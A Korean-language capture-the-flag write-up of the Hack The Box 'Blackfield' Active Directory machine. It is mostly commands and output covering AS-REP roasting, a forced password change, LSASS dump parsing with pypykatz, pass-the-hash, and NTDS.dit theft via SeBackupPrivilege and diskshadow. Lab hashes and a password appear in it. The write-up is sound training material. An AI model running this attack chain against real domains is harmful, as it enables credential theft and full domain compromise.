# HTB-BLACKFIELD

```bash
OS: Windows(AD)
DATE: 26.10.23
DIFFICULTY: Hard
```

## RECON

**nmap**

초기 정찰을 위해 전체 포트 스캔과 상세 포트 스캔을 진행하였다.

```bash
nmap -p- -T4 IP | grep -oP '^\d+/tcp' | cut -d/ -f1 | paste -sd,
```

```bash
nmap -sC -sV -p 53,88,135,389,445,593,3268,5985 blackfield.local | tee nmap
```

포트 스캔 결과, 88번과 389번 포트 등을 통해 AD DC 서버임을 확인할 수 있었다. 또한 메인 도메인과 서브도메인인 `DC01.blackfield.local`을 확인하였다.

이후 SMB 서비스가 작동 중이므로 Guest 계정으로 열거가 가능한지 확인하고, 사용자 이름을 알아내기 위해 RID Brute Force도 진행하였다.

```bash
smbclient -L //BLACKFIELD.local -N

Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
forensic        Disk      Forensic / Audit share.
IPC$            Disk      Remote IPC
NETLOGON        Disk      Logon server share
profiles$       Disk
SYSVOL          Disk      Logon server share
```

```bash
nxc smb IP -u asd -p '' --users
```

```bash
nxc smb IP -u asd -p '' --rid-brute

SMB         10.129.88.18    445    DC01             [+] BLACKFIELD.local\asd: (Guest)
SMB         10.129.88.18    445    DC01             498: BLACKFIELD\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.88.18    445    DC01             500: BLACKFIELD\Administrator (SidTypeUser)
SMB         10.129.88.18    445    DC01             501: BLACKFIELD\Guest (SidTypeUser)
SMB         10.129.88.18    445    DC01             502: BLACKFIELD\krbtgt (SidTypeUser)
```

그 결과, Guest 계정을 통해 공유 폴더를 열거할 수 있었다. 또한 RID Brute Force를 통해 사용자 이름을 알아낼 수 있었으므로, 사용자 이름만 추출하여 `users` 파일에 저장하였다.

```bash
nxc smb IP -u asd -p '' --rid-brute | grep SidTypeUser | awk -F'\\\\' '{print $2}' | awk '{print $1}' | tee users
```

## Initial Access

먼저 앞서 확인한 공유 폴더인 `forensic`과 `profiles$`를 열거해 보았다.

`forensic` 공유 폴더에는 접근할 권한이 없었지만, `profiles$` 공유 폴더에서는 여러 사용자의 이름으로 된 폴더를 확인할 수 있었다. 따라서 `recurse` 옵션을 활성화하여 내부를 열거해 보았다.

```bash
smb> recurse on
smb> ls
```

많은 사용자의 폴더를 확인할 수 있었지만, 내부에는 파일이 존재하지 않았다.

따라서 앞서 확보한 사용자 목록을 이용하여 AS-REP Roasting 공격을 시도하였다.

```bash
nxc ldap BLACKFIELD.local -u users -p '' --asreproast asrep

LDAP        10.129.88.18    389    DC01             $krb5asrep$23$support@BLACKFIELD.LOCAL:26d68b8ef551f494c84baf4f60d61af7$b8cc8311ea027182b31c2ae8ba6705e75f8e49e4162
```

그 결과, `support` 사용자의 Kerberos AS-REP 해시를 획득할 수 있었다. 이후 Hashcat을 사용하여 해시 크래킹을 진행하였다.

```bash
hashcat -m 18200 asrep /usr/share/wordlists/rockyou.txt
```

이를 통해 `support` 사용자의 평문 비밀번호를 획득하였다.

이후 해당 계정의 인증 정보를 이용하여 BloodHound 분석, LDAP 열거, `forensic` 공유 폴더 접근 등을 시도하였다. 하지만 여전히 `forensic` 공유 폴더에는 접근할 수 없었다.

따라서 BloodHound에서 Outbound 관계를 확인하였다.

```bash
bloodhound-start
```

![blood](attach_real/Pasted%20image%2020261027104526.png)

Outbound 관계를 확인한 결과, `AUDIT2020` 사용자와 `ForceChangePassword` 관계가 존재하였다.

따라서 `net rpc` 도구를 사용하여 `AUDIT2020` 사용자의 비밀번호를 변경하였다.

```bash
net rpc password "AUDIT2020" "passwd123" -U "BLACKFIELD.local"/"support"%"#00^BlackKnight" -S "DC01.BLACKFIELD.local"
```

```bash
nxc smb IP -u AUDIT2020 -p passwd123

PWN!
```

비밀번호 변경 후 NetExec를 사용하여 인증을 확인하였고, 변경한 비밀번호로 인증에 성공한 것을 확인하였다.

이제 해당 인증 정보를 이용하여 `forensic` 공유 폴더에 접근하였다. 그 결과, 접근에 성공하였다.

```bash
smbclient //BLACKFIELD.local/forensic -U audit2020%passwd123
```

공유 폴더 내부에는 크게 `commands_output`, `memory_analysis`, `tools`라는 세 개의 폴더가 존재하였다.

먼저 `commands_output` 폴더 내부의 여러 TXT 파일을 확인하였지만, 별다른 중요 정보를 얻지 못했다. 따라서 `memory_analysis` 폴더를 확인하였다.

해당 폴더에서 `lsass.zip` 파일을 발견하였다.

LSASS(Local Security Authority Subsystem Service)는 Windows에서 사용자 인증과 보안 정책 적용을 담당하는 핵심 시스템 프로세스이다. 따라서 해당 파일에 중요한 인증 정보가 포함되어 있을 가능성이 있다고 판단하여 다운로드를 시도하였다.

```bash
smb> get lsass.zip
```

하지만 파일 크기 때문인지 `smbclient`에서 다운로드 도중 타임아웃이 발생하였다. 따라서 다른 도구를 사용해 보기로 하였다.

조사 결과, `smbget` 도구를 사용할 수 있음을 확인하여 이를 이용해 파일을 다운로드하였다.

```bash
smbget "smb://BLACKFIELD.local/forensic/memory_analysis/lsass.zip" -U AUDIT2020
```

이를 통해 `lsass.zip` 파일을 로컬 시스템으로 다운로드하는 데 성공하였다.

이후 압축을 해제하고 내부 파일을 확인하였다.

```bash
unzip lsass.zip -d zip
```

압축 파일 내부에는 `lsass.DMP`라는 메모리 덤프 파일이 존재하였다.

LSASS 덤프 파일에서 인증 정보를 추출하기 위해 관련 도구를 조사하였다. 먼저 [Mimikatz 관련 기술 자료](https://attack.mitre.org/techniques/T1003/001/)를 통해 LSASS 메모리에서 인증 정보를 추출할 수 있다는 것을 확인하였다.

하지만 Mimikatz는 주로 Windows 환경에서 사용되므로, Linux 환경에서 사용할 수 있는 대체 도구인 `pypykatz`를 조사하였다.

그 결과, [pypykatz를 이용한 LSASS 덤프 분석 방법](https://medium.com/@offsecdeer/dumping-lsass-remotely-from-linux-efc47391e56d)을 확인하였고, 해당 방법을 참고하여 분석을 진행하였다.

```bash
pypykatz lsa minidump lsass.DMP > lass
```

이후 분석 결과가 저장된 파일을 확인하였다.

```dmp
FILE: ======== lsass.DMP =======
== LogonSession ==
authentication_id 406458 (633ba)
session_id 2
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406458
    == MSV ==
        Username: svc_backup
        Domain: BLACKFIELD
        LM: NA
        NT: 9658d1d1dcd9250115e2205d9f48400d
        SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
        DPAPI: a03cd8e9d30171f3cfe8caad92fef62100000000
```

분석 결과, `svc_backup` 사용자의 NT 해시를 획득하였다.

따라서 해당 해시를 이용한 Pass-the-Hash(PTH) 인증을 시도하였다. 그 결과, 원격 셸에 접속하는 데 성공하였으며 사용자 플래그를 획득할 수 있었다.

```bash
evil-winrm -i IP -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
```

![user](attach_real/Pasted%20image%2020261027020449.png)

## Privilege Escalation

사용자 셸을 획득한 후 현재 계정의 권한을 확인하였다.

```ps1
whoami /all

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
```

확인 결과, `SeBackupPrivilege`라는 중요한 권한이 활성화되어 있었다.

해당 권한을 이용하면 파일 시스템의 백업 관련 제한을 우회하여 보호된 파일에 접근할 수 있다. 따라서 SAM 및 SYSTEM 하이브 파일을 로컬로 복사한 뒤, 해시를 추출하는 방법을 시도하였다.

먼저 임시 디렉터리를 생성하였다.

```ps1
mkdir C:\temp
```

이후 SAM 및 SYSTEM 하이브 파일을 저장하였다.

```ps1
reg save hklm\sam C:\temp\sam.hive
```

```ps1
reg save hklm\system C:\temp\system.hive
```

저장한 파일을 로컬 시스템으로 다운로드하였다.

```ps1
download C:\temp\sam.hive
```

```ps1
download C:\temp\system.hive
```

SAM 및 SYSTEM 파일을 로컬로 옮긴 후, Impacket의 `secretsdump`를 사용하여 해시를 추출하였다.

```bash
impacket-secretsdump -sam sam.hive -system system.hive LOCAL

[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:67ef902eae0d740df6257f273de75051:::
```

이제 Administrator 계정의 NT 해시를 획득하였으므로, Pass-the-Hash를 이용한 셸 접속 및 SMB 인증을 시도하였다.

하지만 인증에 실패하였다.

```bash
nxc smb IP -u administrator -H 67ef902eae0d740df6257f273de75051

SMB         10.129.88.18    445    DC01             [-] BLACKFIELD.local\administrator:67ef902eae0d740df6257f273de75051 STATUS_LOGON_FAILURE
```

확인 결과, 추출한 해시는 로컬 SAM에 저장된 Administrator 계정의 해시였다. SAM에는 해당 시스템의 로컬 계정 정보가 저장되어 있다.

하지만 현재 대상은 도메인 컨트롤러인 DC01이므로, 목표는 로컬 Administrator 계정이 아닌 도메인 Administrator 계정의 해시를 획득하는 것이었다.

따라서 도메인 계정 정보가 저장된 `NTDS.dit` 파일을 추출해야 했다.

이를 위해 [SeBackupPrivilege를 이용한 NTDS.dit 추출 방법](https://github.com/k4sth4/SeBackupPrivilege)을 참고하여 공격을 진행하였다.

먼저 필요한 모듈을 추가하였다.

```ps1
import-module .\SeBackupPrivilegeCmdLets.dll
import-module .\SeBackupPrivilegeUtils.dll
```

이후 로컬에서 `vss.dsh` 파일을 생성하고, 파일 형식을 Windows에서 사용할 수 있도록 변환하였다.

```bash
echo "
set context persistent nowriters
set metadata c:\\\programdata\\\test.cab
set verbose on
add volume c: alias test
create
expose %test% z:" > vss.dsh
```

```bash
unix2dos vss.dsh
```

이후 해당 파일을 원격 셸에 업로드한 뒤, `diskshadow`를 사용하여 스크립트를 실행하였다.

```ps1
diskshadow /s c:\Users\svc_backup\Documents\vss.dsh
```

스크립트가 정상적으로 실행된 것을 확인한 후, 백업 권한을 이용하여 `NTDS.dit` 파일을 복사하였다.

```ps1
Copy-FileSeBackupPrivilege z:\\\Windows\\\ntds\\\ntds.dit c:\\\Users\\\svc_backup\ntds.dit
```

이후 해당 파일을 로컬 시스템으로 다운로드하고, `secretsdump`를 이용하여 도메인 계정의 해시를 추출하였다.

```bash
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

그 결과, 도메인 Administrator 계정의 NT 해시를 획득하였다. 이를 이용하여 최종 권한을 확보하고 Root 플래그를 획득하였다.

![root](attach_real/Pasted%20image%2020261027030936.png)

## New Inform

- AS-REP Roasting을 수행하면 해시가 파일로 저장되므로, 크래킹 시 해당 파일을 활용하자.
- SMB에서 파일을 다운로드할 때 오류가 발생한다면 `smbget`과 같은 다른 도구를 사용해 보자.
- 하나의 도구가 제대로 작동하지 않는다면 다른 도구를 시도하는 습관을 들이자.
- ZIP 파일 내부에는 여러 파일이 포함되어 있을 수 있으므로, 압축을 해제한 뒤 꼼꼼하게 열거하자.
- LSASS는 인증 정보와 관련된 중요한 데이터를 메모리에 보관할 수 있다.
- `lsass.DMP`와 같은 메모리 덤프 파일은 Mimikatz 등의 도구를 이용해 분석할 수 있다.
- Mimikatz를 Windows 환경에서 사용하기 어렵다면, Linux에서 사용할 수 있는 대안인 `pypykatz`를 조사해 보자.
- SAM에는 로컬 계정 정보가 저장되며, `NTDS.dit`에는 Active Directory 도메인 계정 정보가 저장된다.
- NTDS.dit 추출 과정에서 원격 복사가 원활하지 않다면, 로컬 시스템에서 파일을 추출하는 방법을 고려하자.
- 도구를 사용할 때는 공식 문서와 사용 설명서를 꼼꼼하게 확인하자.
- NTDS.dit 추출 및 분석 과정은 상당한 시간이 소요될 수 있으므로 충분한 시간을 확보하자.